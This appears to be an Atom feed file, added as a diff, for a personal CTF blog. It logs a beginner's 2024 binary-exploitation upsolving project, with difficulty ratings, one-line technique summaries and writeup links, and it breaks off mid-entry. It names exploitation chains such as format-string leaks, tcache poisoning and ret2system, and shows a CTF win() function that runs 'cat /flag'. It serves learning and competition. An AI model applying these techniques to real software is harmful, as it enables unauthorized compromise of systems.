@@ -1,0 +1,1295 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>kh4rg0sh Blog!</title>
+ <link href="http://localhost:4000/atom.xml" rel="self"/>
+ <link href="http://localhost:4000/"/>
+ <updated>2026-01-01T12:03:19+05:30</updated>
+ <id>http://localhost:4000</id>
+ <author>
+   <name>Mmukul Khedekar</name>
+   <email></email>
+ </author>
+
+ 
+ <entry>
+   <title>BackdoorCTF 2024</title>
+   <link href="http://localhost:4000/2024/12/25/backdoorctf-2024/"/>
+   <updated>2024-12-25T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2024/12/25/backdoorctf-2024</id>
+   <content type="html">&lt;style&gt;
+.gist-collapsed {
+  max-height: 9rem;
+  overflow: hidden;
+  position: relative;
+  margin-bottom: 1rem;
+}
+
+.gist-collapsed::after {
+  content: &quot;Show more&quot;;
+  position: absolute;
+  bottom: 0;
+  right: 0;
+  padding: 6px 10px;
+  background: linear-gradient(to right, transparent, #fff);
+  cursor: pointer;
+  font-size: 0.9em;
+  color: #555;
+}
+
+.gist-expanded {
+  max-height: none;
+}
+
+.gist-expanded::after {
+  content: &quot;Show less&quot;;
+}
+&lt;/style&gt;
+
+&lt;script&gt;
+document.addEventListener(&quot;click&quot;, e =&gt; {
+  const box = e.target.closest(&quot;.gist-collapsed&quot;);
+  if (!box) return;
+  box.classList.toggle(&quot;gist-expanded&quot;);
+});
+&lt;/script&gt;
+
+&lt;p&gt;For this year’s Backdoor CTF, I proposed two challenges. Both of these challenges were based on Lattice attacks (as that is the area I am currently working on for my lab based project on post-quantum cryptography). The challenges and their writeups are uploaded on &lt;a href=&quot;https://gist.github.com/kh4rg0sh/e377ee63eecfa7060c72e887429fb510&quot; target=&quot;_blank&quot;&gt;Github Gist&lt;/a&gt;.&lt;/p&gt;
+
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;
+&lt;script src=&quot;https://gist.github.com/e377ee63eecfa7060c72e887429fb510.js?file=hashing_frenzy_writeup.md&quot;&gt; &lt;/script&gt;
+
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;
+&lt;script src=&quot;https://gist.github.com/e377ee63eecfa7060c72e887429fb510.js?file=a_complex_shamir_writeup.md&quot;&gt; &lt;/script&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Binary Exploitation 2024</title>
+   <link href="http://localhost:4000/2024/10/15/binary-exploitation/"/>
+   <updated>2024-10-15T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2024/10/15/binary-exploitation</id>
+   <content type="html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;motivated by this blog:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a href=&quot;https://ptr-yudai.hatenablog.com/entry/2019/07/01/143652&quot; target=&quot;_blank&quot;&gt;https://ptr-yudai.hatenablog.com/entry/2019/07/01/143652&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;i’ll be attempting to do something similar. at the time of writing this doc, it’s already the mid of october. there’s not even 3 months left for this year to end. the goal of this challenge would be to upsolve all the pwn challenges that were introduced in alls the CTFs this year. since i’m a beginner (i started pwn seriously 2 months ago), i’ll only be attempting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C/C++ pwn&lt;/code&gt; and that too i’ll stick to userland pwn only! the format of the challenge would be as follows:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;mention the name, ctftime link and the archive link of the CTF.&lt;/li&gt;
+  &lt;li&gt;list down all the pwn category challenges in this doc.&lt;/li&gt;
+  &lt;li&gt;attempt each challenge for about 2 to 3 hours. if there’s some progress note that down. if there isn’t read a writeup and whatever new knowledge you’ve acquired should be introduced as a blog post on your blog.&lt;/li&gt;
+  &lt;li&gt;re-write the entire writeup in your own words. this also involves crafting the exploit script in your own style.&lt;/li&gt;
+  &lt;li&gt;if you are not able to provide a writeup for a challenge, mention the reason.&lt;/li&gt;
+  &lt;li&gt;an exception to not attempting a challenge would be in drastic conditions such as almost impossible to produce the environment in which the challenge was deployed, etc.&lt;/li&gt;
+  &lt;li&gt;every challenge should begin with a TLDR. this TLDR should mention the important techniques involved and the exploit path that you took.&lt;/li&gt;
+  &lt;li&gt;you should also rate challenges on the scale of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 to 10&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;rating-scale&quot;&gt;Rating Scale&lt;/h2&gt;
+&lt;p&gt;the difficulty rating scale that i propose here is a subject to change as per the requirements in the future. so these must be considered as tentative but the difficulty rating that i give to the problems would strictly follow whatever’s mentioned here.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Difficulty = 1:&lt;/strong&gt; very easy braindead pwn including bandit wargame type pwn challenges that do not require any exploitation knowledge apart from being able to use linux.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Difficulty = 2 - 4:&lt;/strong&gt; ranging from trivial programming errors such as integer overflow, buffer overflow to writing trivial ROP chains and format string vulnerabilities to perform ret2win, ret2system, etc.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Difficulty = 5 - 6:&lt;/strong&gt; Intermediate tasks such as partial overwrite of GOT/PLT entries and other techniques such as ret2csu, ret2dlresolve, etc.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Difficulty = 7 - 8:&lt;/strong&gt; From SROP and introductory heap challenges to FSOP and targetting complex structures in the binary&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Difficulty = 9 - 10:&lt;/strong&gt; Challenges that are basically completely out of my league.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;irisctf-6th-jan-2024&quot;&gt;IrisCTF [6th Jan, 2024]&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;ctftime link: &lt;a href=&quot;https://ctftime.org/event/2085&quot; target=&quot;_blank&quot;&gt;https://ctftime.org/event/2085&lt;/a&gt;&lt;br /&gt;
+archive link: &lt;a href=&quot;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/IrisCTF/2024/pwn&quot; target=&quot;_blank&quot;&gt;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/IrisCTF/2024/pwn&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: overall very nice challenges. loved these.
+    &lt;h2 id=&quot;insanity-check&quot;&gt;Insanity-Check&lt;/h2&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-210&quot;&gt;Difficulty: 2/10&lt;/h3&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: ret2win just get the right offsets and the printed message aligns with the target.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/insanity-check&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/insanity-check&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: the problem is kinda dumb imo, but this problem showcases an interesting aspect to challenge authors pertaining to crafting custom addresses for functions. i wonder how did they manage to do this.
+    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;__asm__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pop %rdi&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cat /flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;believe it or not, this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;win()&lt;/code&gt; function is at a very funny memory address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6d6f632e&lt;/code&gt; which translates to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.com&lt;/code&gt; in little endian.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;serious-banking&quot;&gt;Serious Banking&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-510&quot;&gt;Difficulty: 5/10&lt;/h3&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: `C++ pwn` with signed char negative indexing leveraging to a format string vulnerability to leak libc address and then `ret2system`.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/serious-banking&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/serious-banking&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: i expected this challenge to be based on some &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C++ STL&lt;/code&gt; vulnerability. however, it turns out that the vulnerability was the usage of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signed char&lt;/code&gt; in indexing. nevertheless, this is still an interesting challenge. this is the second time im witnessing brutally ripping off program control flow due to a mere &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;signed char&lt;/code&gt; indexing.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;also i found the path to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2system&lt;/code&gt; kinda innovative in this problem. the stack frame deallocation assembly looked somewhat like&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;0x0000000000001812 &amp;lt;+1426&amp;gt;:  add    rsp,0x38
+0x0000000000001816 &amp;lt;+1430&amp;gt;:  pop    rbx
+0x0000000000001817 &amp;lt;+1431&amp;gt;:  pop    r12
+0x0000000000001819 &amp;lt;+1433&amp;gt;:  pop    r13
+0x000000000000181b &amp;lt;+1435&amp;gt;:  pop    r14
+0x000000000000181d &amp;lt;+1437&amp;gt;:  pop    r15
+0x000000000000181f &amp;lt;+1439&amp;gt;:  pop    rbp
+0x0000000000001820 &amp;lt;+1440&amp;gt;:  ret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;so instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi; &amp;lt;bin_sh&amp;gt;; system;&lt;/code&gt; i did &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rdi, r12; call rbx;&lt;/code&gt; and since we already control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r12&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbx&lt;/code&gt; register, this still paves its way to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2system&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;memory-not-solved&quot;&gt;Memory [Not Solved]&lt;/h2&gt;
+&lt;p&gt;a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernel&lt;/code&gt; pwn. im not attempting these right now.&lt;/p&gt;
+
+&lt;h2 id=&quot;sequilitis-not-solved&quot;&gt;Sequilitis [Not Solved]&lt;/h2&gt;
+&lt;p&gt;this challenge is related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite3&lt;/code&gt; pwning. im not attempting this right now.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;uoftctf-13th-jan-2024&quot;&gt;UofTCTF [13th Jan, 2024]&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;ctftime link: &lt;a href=&quot;https://ctftime.org/event/2219&quot; target=&quot;_blank&quot;&gt;https://ctftime.org/event/2219&lt;/a&gt;&lt;br /&gt;
+archive link: &lt;a href=&quot;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/UofTCTF/2024/pwn&quot; target=&quot;_blank&quot;&gt;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/UofTCTF/2024/pwn&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;basic-overflow&quot;&gt;Basic Overflow&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-110&quot;&gt;Difficulty: 1/10&lt;/h3&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: simple ret2win
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/basic_overflow&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/basic_overflow&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: this is too stupid to be a CTF challenge. hate this.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;baby-shellcode&quot;&gt;Baby Shellcode&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-110-1&quot;&gt;Difficulty: 1/10&lt;/h3&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: read into the stack and `jmp, rsp`. write a trivial shellcode.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/baby_shellcode&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/baby_shellcode&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: a really dumb challenge. i regret solving this.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;patched-shell&quot;&gt;Patched Shell&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-210-1&quot;&gt;Difficulty: 2/10&lt;/h3&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: ret2win with stack misalignment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/patched_shell&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/patched_shell&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: too standard to be a CTF challenge in my opinion.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;nothing-to-return&quot;&gt;Nothing to Return&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-210-2&quot;&gt;Difficulty: 2/10&lt;/h3&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: straightforward ret2system
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/nothing_to_return&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/nothing_to_return&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: again too straightforward. overall i feel like the pwn challenges in this CTF are just too dumb. what a waste of time.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;hkust-firebird-ctf-20th-jan-2024&quot;&gt;HKUST Firebird CTF [20th Jan, 2024]&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;ctftime link: &lt;a href=&quot;https://ctftime.org/event/2225&quot; target=&quot;_blank&quot;&gt;https://ctftime.org/event/2225&lt;/a&gt;&lt;br /&gt;
+archive link: &lt;a href=&quot;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/HKUSTFirebird/2024/pwn&quot; target=&quot;_blank&quot;&gt;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/HKUSTFirebird/2024/pwn&lt;/a&gt;&lt;br /&gt;
+website: &lt;a href=&quot;https://ash.firebird.sh/challenges&quot; target=&quot;_blank&quot;&gt;https://ash.firebird.sh/challenges&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: overall high quality challenges. totally recommended to solve!
+    &lt;h2 id=&quot;moonblast&quot;&gt;MoonBlast&lt;/h2&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-310&quot;&gt;Difficulty: 3/10&lt;/h3&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: rand() simulation. ROP to obtain a libc leak via `puts(GOT[puts])` then ret2system
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/MoonBlast&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/MoonBlast&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: i liked the part of having to write a local program that would generate the right passcode to pass the protection. apart from that, this was a pretty standard libc leak via ropping and abusing the PLT entries to ret2system. pretty standard.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;mercuryblast&quot;&gt;MercuryBlast&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-610&quot;&gt;Difficulty: 6/10&lt;/h3&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: UAF + heapoverflow =&amp;gt; tcache poisoning and overwrite `__free_hook`.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/MercuryBlast&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/MercuryBlast&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: awesome challenge! this was fun. this was the first time i performed a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache poisoning&lt;/code&gt; attack without any external help. the vulnerability was evident, but it was a great learning experience. recommended challenge for introductory heap exploitation! i, myself, learnt a couple of things while playing around devising strategies to attack this program.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;mpi-unsolved&quot;&gt;mpi [Unsolved]&lt;/h2&gt;
+&lt;p&gt;attempting: no clue yet&lt;/p&gt;
+
+&lt;h2 id=&quot;unsetenv-unsolved&quot;&gt;unsetenv [Unsolved]&lt;/h2&gt;
+&lt;p&gt;attempting: no clue yet&lt;/p&gt;
+
+&lt;h2 id=&quot;uwuof-super-arm-deluxe-edition-not-solved&quot;&gt;UwUOF+++ Super ARM Deluxe Edition [Not Solved]&lt;/h2&gt;
+&lt;p&gt;ARM binary. not pwning different target architecture binaries right now atleast. save these for the future.&lt;/p&gt;
+
+&lt;h2 id=&quot;trim-not-solved&quot;&gt;trim [Not Solved]&lt;/h2&gt;
+&lt;p&gt;this is a lua pwn challenge. currently, im not dealing with these types of challenges. save these for the future.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;insomnihack-teaser-20th-jan-2024&quot;&gt;Insomni’Hack Teaser [20th Jan, 2024]&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;ctftime link: &lt;a href=&quot;https://ctftime.org/event/2139&quot; target=&quot;_blank&quot;&gt;https://ctftime.org/event/2139&lt;/a&gt;&lt;br /&gt;
+archive link: &lt;a href=&quot;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/insomnihack/2024/Quals/pwn&quot; target=&quot;_blank&quot;&gt;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/insomnihack/2024/Quals/pwn&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;comments: okayish challenges.&lt;/p&gt;
+
+&lt;h2 id=&quot;vaulty&quot;&gt;Vaulty&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty--310&quot;&gt;Difficulty = 3/10&lt;/h3&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: format string and buffer overflow =&amp;gt; obtain libc leak, elf leak and canary leak =&amp;gt; ROP to ret2system
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/Vaulty&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/Vaulty&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: pretty standard challenge that exploits format string vulnerability. didn’t learn anything new tbh. recommended to beginners, however!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;tinderbox-not-solved&quot;&gt;Tinderbox [Not Solved]&lt;/h2&gt;
+&lt;p&gt;wasm pwn challenge. wont be solving this now. ill save this up for future when i touch browser pwn.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;mapna-ctf-20th-jan-2024&quot;&gt;Mapna CTF [20th Jan, 2024]&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;ctftime link: &lt;a href=&quot;https://ctftime.org/event/2205&quot; target=&quot;_blank&quot;&gt;https://ctftime.org/event/2205&lt;/a&gt;&lt;br /&gt;
+archive link: &lt;a href=&quot;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/Mapna/2024/pwn&quot; target=&quot;_blank&quot;&gt;https://github.com/sajjadium/ctf-archives/tree/main/ctfs/Mapna/2024/pwn&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;ninipwn&quot;&gt;ninipwn&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-310-1&quot;&gt;Difficulty: 3/10&lt;/h3&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: global variable overflow + format string bug =&amp;gt; ret2win
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/ninipwn&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/ninipwn&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: kinda creative problem. i found out the format string bug. it was very evident to be honest however that kinda lead me in the wrong direction. i was trying to somehow overwrite the last byte of the return address using the format string but it felt impossible. that’s when i noticed there was another bug, the overflow in the global variables in the data section. that was kinda unexpected and creative. nice challenge.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;buggy-paint&quot;&gt;Buggy Paint&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;h3 id=&quot;difficulty-710&quot;&gt;Difficulty: 7/10&lt;/h3&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;summary: Use After Free =&amp;gt; leak heap, libc and stack =&amp;gt; tcache poisoning to obtain arbitary read and write =&amp;gt; ROP chain on the stack to perform ret2system
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;writeup link: &lt;a href=&quot;https://github.com/kh4rg0sh/project-2024/tree/main/Buggy_Paint&quot; target=&quot;_blank&quot;&gt;https://github.com/kh4rg0sh/project-2024/tree/main/Buggy_Paint&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comments: awesome challenge! the challenge premise didn’t feel forced for a pwning challenge. with all the security mitigations enabled and a fully functional paint application, the bug (use after free) in the program did not feel intentional. very realistic premise, a bug that a novice programmer would definitely commit.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;also this was the first time i exploited a heap challenge that used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc ver. 2.35&lt;/code&gt;. so this was very educational. also i believe that there are other exploitation paths to exploit this program as well. i read a writeup that involved FSOP. so that’s something id like to look into the future.&lt;/p&gt;
+
+&lt;p&gt;overall a recommended challenge for heap exploitation novices who want familiarity with exploiting programs in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc 2.35&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;protector-unsolved&quot;&gt;Protector [Unsolved]&lt;/h2&gt;
+&lt;p&gt;trying to think of an exploit. right now, the only thing i can think of is ORW using ROP. but my ROP chain is longer than what they per&lt;/p&gt;
+
+&lt;h2 id=&quot;u2s-not-solved&quot;&gt;U2S [Not Solved]&lt;/h2&gt;
+&lt;p&gt;this is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lua&lt;/code&gt; pwn challenge. ill do these later. leaving this challenge for now, not attempting.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;0xl4ugh-ctf-9th-feb-2024&quot;&gt;0xL4ugh CTF [9th Feb, 2024]&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;ctftime link: &lt;a href=&quot;https://ctftime.org/event/2216&quot; target=&quot;_blank&quot;&gt;https://ctftime.org/event/2216&lt;/a&gt;&amp;lt;/br&amp;gt;
